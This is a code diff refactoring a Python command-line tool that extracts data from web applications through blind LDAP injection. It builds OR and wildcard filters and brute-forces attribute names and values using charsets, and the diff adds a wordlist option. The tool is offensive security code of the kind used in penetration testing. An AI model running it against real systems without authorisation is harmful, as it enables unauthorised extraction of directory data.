@@ -49,13 +49,19 @@ http://www.ietf.org/rfc/rfc1960.txt
 
 import argparse, logging, string, requests, sys, itertools, timeit
 
+class BruteforceOptions():
+    charset = None
+    wordlist_file = None
+
 class LdapGlobals():
     BRUTE = "BRUTE"
     start_time = timeit.default_timer()
     total_progress_calls = 0
     total_requests = 0
+    bruteforce_options = BruteforceOptions()
 
 LDAP_GLOBALS = LdapGlobals()
+CHARSET_DEFAULT = "lower_and_digit"
 
 def request_true(url, true_string):
     progress_indicate()
@@ -74,7 +80,13 @@ def brute_char(base_url, charset, true_string, prefix):
 
     return valid
 
-def brute(base_url, true_string, charset):
+def progress_indicate():
+    LDAP_GLOBALS.total_progress_calls += 1
+    if LDAP_GLOBALS.total_progress_calls % 50 == 0:
+        logging.info(str(LDAP_GLOBALS.total_progress_calls) + "...")
+
+def brute(base_url, true_string):
+    charset = charset_get()
     logging.info("Entering wildcard brute mode for URL '%s'." % base_url)
     logging.debug("Going to brute with chars %s" % charset)
 
@@ -110,7 +122,8 @@ def brute(base_url, true_string, charset):
 
     return exist
 
-def or_generate(charset, space_per_request, attribute_name, word_size, size_is_exact):
+def or_generate(space_per_request, attribute_name, word_size, size_is_exact):
+    charset = charset_get()
     or_base = "(|%s)"
     or_base_len = len(or_base) - 2
     real_free = space_per_request - or_base_len
@@ -159,26 +172,19 @@ def or_loop(or_subfilter):
         if spl != "":
             yield spl + ")"
 
-def progress_indicate():
-    LDAP_GLOBALS.total_progress_calls += 1
-    if LDAP_GLOBALS.total_progress_calls % 50 == 0:
-        logging.info(str(LDAP_GLOBALS.total_progress_calls) + "...")
-
 # all parameters are arguments gotten from the command line.
-def brute_nowild(base_url, true_string, charset, attribute_name, word_size, max_path_size=8100, size_is_exact=False):
+def brute_nowild(base_url, true_string, attribute_name, word_size, max_path_size=8100, size_is_exact=False):
     bruting_attr = attribute_name == LDAP_GLOBALS.BRUTE
     if bruting_attr:
         logging.info("entering non-wildcard mode for url '%s' (bruteforcing attribute names)." % base_url)
     else:
         logging.info("entering non-wildcard mode for url '%s' (bruteforcing '%s')." % (base_url, attribute_name))
 
-    logging.debug("Going to brute with chars %s up to %s length" % (charset, word_size))
-
     # we are going to do (|(cn="a")(cn="b")[...]) until max_path_size so as to know if any of the
     # possibilities are valid.
     exist = []
     space_per_request = max_path_size - (len(base_url) - 2)
-    or_subfilters = or_generate(charset, space_per_request, attribute_name, word_size, size_is_exact)
+    or_subfilters = or_generate(space_per_request, attribute_name, word_size, size_is_exact)
     for or_subfilter in or_subfilters:
         url = base_url % or_subfilter
         if request_true(url, true_string):
@@ -214,14 +220,18 @@ def parser_get():
         injection, with a %%s where the injection is.""")
     parser.add_argument('TRUE_STRING', help="""A string that appears in the
         response if LDAP says True. If string doesnt appear, false is assumed.""")
-
-    parser.add_argument("--charset", "-c", help="""The set of characters the
-        script will attempt to use while bruteforcing.""",
-        choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex', 'digits', 'lower'],
-        default="lower_and_digit")
     parser.add_argument("--verbosity", "-v", type=int, help="0 warn, 1 info, 2 debug", default=1)
-    parser.add_argument("--charset-custom", "-C", help="""A custom string that
-        contains all the charcters to use. E.g. '-C ABC389'""")
+
+    bruteforce_options = parser.add_mutually_exclusive_group()
+    bruteforce_options.add_argument("--charset", "-c", help="""The set of
+    characters the script will attempt to use while bruteforcing.""",
+    choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex',
+        'digits', 'lower'], default=CHARSET_DEFAULT)
+    bruteforce_options.add_argument("--charset-custom", "-C", help="""A custom string that
+        contains all the charcters to use. E.g. '-C ABC389'""", default=None)
+    bruteforce_options.add_argument("--wordlist", "-w", help="""For non-wildcard
+        only: The path to a file we will use to bruteforce either attribute
+        names or values.""", default=None)
 
     parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
         honor the wildcard. These need to be bruteforced without a wildcard, which
@@ -237,15 +247,17 @@ def parser_get():
         defines how long requests will be.""", default=8100)
     parser.add_argument("--attribute-name", "-a", help="""Required for
         non-wildcard bruteforcing.""")
-    group = parser.add_mutually_exclusive_group()
-    group.add_argument("--max-word-size", help="""For wildcard only: the max
+
+    length_group = parser.add_mutually_exclusive_group()
+    length_group.add_argument("--max-word-size", help="""For wildcard only: the max
         max length we are going to attempt to bruteforce.""", type=int, default=6)
-    group.add_argument("--exact-word-size", help="""For wildcard only: The
+    length_group.add_argument("--exact-word-size", help="""For wildcard only: The
         exact length of the string we are going to bruteforce.""", default=None, type=int)
 
     return parser
 
-def charset_get(charset_name):
+
+def charset_get_premade(charset_name):
     if charset_name == "lower_and_digit":
         charset = string.ascii_lowercase + string.digits
     elif charset_name == "upperlower_and_digits":
@@ -258,6 +270,17 @@ def charset_get(charset_name):
         charset = string.ascii_lowercase
 
     return charset
+
+def charset_get():
+    return LDAP_GLOBALS.bruteforce_options.charset
+
+def charset_set(premade_charset_name, custom_charset, wordlist):
+    if wordlist:
+        LDAP_GLOBALS.bruteforce_options.wordlist_file = wordlist
+    elif custom_charset != None:
+        LDAP_GLOBALS.bruteforce_options.charset = custom_charset
+    else:
+        LDAP_GLOBALS.bruteforce_options.charset = charset_get_premade(premade_charset_name)
 
 def succ(result):
     total_time = (timeit.default_timer()) - LDAP_GLOBALS.start_time
@@ -274,13 +297,11 @@ def err(message):
     sys.exit(1)
 
 def main(args, output=True):
-    if(args.charset_custom):
-        charset = args.charset_custom
-    else:
-        charset = charset_get(args.charset)
+
+    charset_set(args.charset, args.charset_custom, args.wordlist)
 
     if not args.no_wildcard and not args.brute_attr:
-        valid_values = brute(args.URL, args.TRUE_STRING, charset)
+        valid_values = brute(args.URL, args.TRUE_STRING)
     else :
         if args.brute_attr:
             attr = LDAP_GLOBALS.BRUTE
@@ -298,9 +319,9 @@ def main(args, output=True):
             word_size = args.max_word_size
 
         valid_values = brute_nowild(base_url=args.URL,
-            true_string=args.TRUE_STRING, charset=charset,
-            max_path_size=args.max_path_size, attribute_name=attr,
-            word_size=word_size, size_is_exact=is_exact)
+                true_string=args.TRUE_STRING, max_path_size=args.max_path_size,
+                attribute_name=attr, word_size=word_size,
+                size_is_exact=is_exact)
 
     if(output):
         succ(valid_values)
